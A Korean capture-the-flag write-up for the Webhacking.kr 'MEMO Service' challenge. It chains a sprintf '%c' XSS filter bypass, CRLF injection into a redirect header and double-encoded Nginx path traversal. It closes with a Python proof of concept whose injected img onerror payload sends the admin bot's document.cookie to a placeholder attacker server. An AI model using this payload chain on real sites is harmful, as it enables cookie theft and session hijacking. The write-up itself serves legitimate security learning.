---
title: '[Webhacking.kr] MEMO Service'
author: hoppi
date: 2023-03-04 21:49:00 + 0000
categories: [Web]
tags: [web, format_string, crlf_injection, xss, nginx]
---

# 코드 분석
***
아래와 같이 메모를 입력할 수 있는 서비스이며, `admin 봇`이 방문하도록 하는 `/report.php` 엔드포인트가 존재합니다.  
![memo](../../../assets/img/2023-03-04/memo.png){: w="700" h="350" }  
<br/>

제공되는 소스 코드는 따로 없었고 페이지 내에서 아래와 같은 자바스크립트가 로드되고 있었습니다. <u>쿠키에 메모의 내용들을 저장</u>하고 있고 17 번째 줄을 보면 `replaceAll()`을 통해서 `'`를 입력하면 `"`로 바꿔주어 `XSS`를 방지합니다.  
```javascript
function saveMemo(){
  if(input.value){
    memo = getCookie('memo');
    if(!memo) memo = [];
    else memo = JSON.parse(atob(memo));
    memo.push(input.value);
    document.cookie = "memo="+btoa(JSON.stringify(memo));
    input.value="";
  }
  loadMemo();
}
function loadMemo(){
  memo = getCookie('memo');
  if(!memo) memo = [];
  else memo = JSON.parse(atob(memo));
  memoValue = "";
  for(i=0;i<memo.length;i++) memoValue = sprintf(memoValue + "<input disabled value='%s'></input><br>",memo[i].replaceAll("'","\""));
  box.innerHTML = memoValue;
}
function clearMemo(){
  memo = [];
  document.cookie = "memo="+btoa(JSON.stringify(memo));
  loadMemo();
}
function getCookie(name) {
  const value = "; "+document.cookie;
  const parts = value.split("; "+name+"=");
  if (parts.length === 2) return parts.pop().split(";").shift();
}
```
<br/>

`hi i'm hoppi`를 입력하면 필터에 의해서 더블 쿼터로 바뀌고 아래와 같이 `input` 태그의 `value`로 저장됩니다.  
![test](../../../assets/img/2023-03-04/test.png){: w="700" h="350" }  
<br/>

# 취약점
***
## XSS Filter Bypass with Format String
***
로드되는 `sprintf.js`를 보면 `switch-case`문을 통해서 각 포멧 스트링에 대한 파싱 형태를 정의하고 있는데 특이하게 10 번째 줄에서 `%c`에 해당하는 case `c`를 보면 `fromCharCode()`를 이용합니다.  
```javascript
// sprintf.js: 69

...

switch (ph.type) {
                    case 'b':
                        arg = parseInt(arg, 10).toString(2)
                        break
                    case 'c':
                        arg = String.fromCharCode(parseInt(arg, 10))
                        break
                    case 'd':
                    case 'i':
                        arg = parseInt(arg, 10)
                        break
                    case 'j':
                        arg = JSON.stringify(arg, null, ph.width ? parseInt(ph.width) : 0)
                        break
                    case 'e':
                        arg = ph.precision ? parseFloat(arg).toExponential(ph.precision) : parseFloat(arg).toExponential()
                        break
                    case 'f':
                        arg = ph.precision ? parseFloat(arg).toFixed(ph.precision) : parseFloat(arg)
                        break
                    case 'g':
                        arg = ph.precision ? String(Number(arg.toPrecision(ph.precision))) : parseFloat(arg)
                        break
                    case 'o':
                        arg = (parseInt(arg, 10) >>> 0).toString(8)
                        break
                    case 's':
                        arg = String(arg)
                        arg = (ph.precision ? arg.substring(0, ph.precision) : arg)
                        break
                    case 't':
                        arg = String(!!arg)
                        arg = (ph.precision ? arg.substring(0, ph.precision) : arg)
                        break
                    case 'T':
                        arg = Object.prototype.toString.call(arg).slice(8, -1).toLowerCase()
                        arg = (ph.precision ? arg.substring(0, ph.precision) : arg)
                        break
                    case 'u':
                        arg = parseInt(arg, 10) >>> 0
                        break
                    case 'v':
                        arg = arg.valueOf()
                        arg = (ph.precision ? arg.substring(0, ph.precision) : arg)
                        break
                    case 'x':
                        arg = (parseInt(arg, 10) >>> 0).toString(16)
                        break
                    case 'X':
                        arg = (parseInt(arg, 10) >>> 0).toString(16).toUpperCase()
                        break
                }

...

```
{: file='sprintf.js'}
<br/>

그렇다면 <u>싱글쿼터에 대한 필터 말고는 입력 값에 제약이 없기 때문에</u> `%c`를 입력하고 싱글쿼터에 해당하는 아스키 번호 `39`를 입력하면 아래와 같이 `escape`할 수 있습니다.  
![escape](../../../assets/img/2023-03-04/escape.png){: w="700" h="350" }  
<br/>

아래와 같은 페이로드를 입력하고 `39`를 입력하면 `XSS`를 발생시킬 수 있습니다.  
![xss](../../../assets/img/2023-03-04/xss.png){: w="700" h="350" }  
<br/>

그렇다면 `XSS`를 트리거 했으니 report만 이용하면 끝이납니다. 하지만 곰곰이 생각해보면 이러한 공격은 쿠키를 통해서 클라이언트 사이드에서만 가능하고 report에서는 url의 path만 입력받고 있습니다. 어떻게하면 `admin 봇`에게 이 쿠키 값을 전달할 수 있을까요?  
<br/>

## CRLF Injection
***
`/` 엔드포인트로 요청을 보낼 때 개발자 모드에서 `Network`탭을 보면 `/favicon.ico`으로 요청을 보내고 `/static/favicon.ico`으로 리다이렉트되고 있었습니다.  
![redirect](../../../assets/img/2023-03-04/redirect.png){: w="700" h="350" }  
<br/>

그렇다면 응답 값에 `Location`헤더가 설정되어 있을 것이고 `CRLF Injection`이 될 가능성이 존재합니다. `\r\n`에 해당하는 `%0d%0a`를 넣어주면 아래와 같이 응답에 임의의 헤더를 입력할 수 있게됩니다.  
![crlf](../../../assets/img/2023-03-04/crlf.png){: w="700" h="350" }  
<br/>

하지만 또 하나의 문제가 존재합니다. 위처럼 요청을 보내게되면 `admin 봇`은 `/` 엔드포인트가 아니라 `/static/favicon.ico`에 갇히고 말죠. 이는 아래의 방법으로 우회가 가능하게됩니다🙃  

## 브라우저와 Nginx의 URL 해석 차이
***
이 포인트는 이미 드림핵에서 [dream-storage](https://dreamhack.io/wargame/challenges/144/)라는 문제로 경험해 본 적이 있습니다. `Nginx`에서는 `..%2f` 이런식으로 보내주면 알아서 디코드하여 상위 경로의 자원으로 브라우저에게 알려줍니다. 하지만 브라우저 입장에서는 이렇게 보내준다면 어디까지가 경로고 어디까지가 디렉토리(path)의 이름인지 구분할 수 없습니다. 정리하면 아래와 같습니다.  

- 브라우저 입장
- /user/..%2ftest/1 -> 하나의 경로로 해석

- 서버 입장
- /~~user/..%2f~~ test/1 -> `%2f`를 디코딩하여 `../`로 인식하게 되고 `/test/1`로 반환
<br/>

이 문제에서는 조금 달랐던 부분은 아래와 같이 `..%2f..%2f`로 보내주면 `400`에러를 만나고  
![2f](../../../assets/img/2023-03-04/2f.png){: w="600" h="300" }  
<br/>

`..%252f..%252f`와 같이 더블 인코딩을 해야 의도대로 리다이렉트가 이루어지고 두번 상위 경로로 이동하여 `/`로 이동할 수 있었습니다.  
![double](../../../assets/img/2023-03-04/double.png){: w="600" h="300" }  
<br/>

# Exploit
***
위의 내용들을 종합하여 아래처럼 `admin 봇`에게 보낼 페이로드를 작성할 수 있습니다.(주의할 것은! `base64`로 인코딩된 `COOKIE_VALUE`가 `=`로 끝나면 정상적으로 익스플로잇이 안됩니다... equal sign으로 인식하는 것인지 어떻게 해도 이렇게 끝나는 것들은 안되더라고요 `==`로 끝나는 것은 잘됩니다 이것 때문에 +2시간 삽질😞)  
- favicon.ico%2f..%252f..%252f%0d%0aSet-Cookie:memo=COOKIE_VALUE;  
<br/>

## PoC Code
***
```python
from requests import post
from base64 import b64encode

info = lambda x : print(f"[+] {x}")

URL = "http://webhacking.kr:10013"
ATTACKER = 'https://YOUR_SERVER'


COOKIE = b64encode(f'["%c><img src=1 onerror=location.href=\\"{ATTACKER}?\\"+document.cookie></img>","39"]'.encode('utf-8')).decode('utf-8')
info(f"Malicious Cookie is {COOKIE}")
data = {"url":f"favicon.ico%2f..%252f..%252f%0d%0aSet-Cookie:memo={COOKIE};"}

res=post(f"{URL}/report.php", data=data)

info('Visit your Server!!')
```
{: file='exploit.py'}
<br/>

생각해야할 것이 많은 문제였습니다. 가뜩이나 요즘 답답한 일도 있고 안풀리는 문제들도 쌓여서 터지기 직전이었는데 이 문제라도 풀어서 다행이네요 ~_~  
![gabi](../../../assets/img/2023-03-04/gabi.jpeg){: w="500" h="250" }  
<br/>

# Reference
***
- [https://www.hahwul.com/cullinan/crlf-injection/](https://www.hahwul.com/cullinan/crlf-injection/)


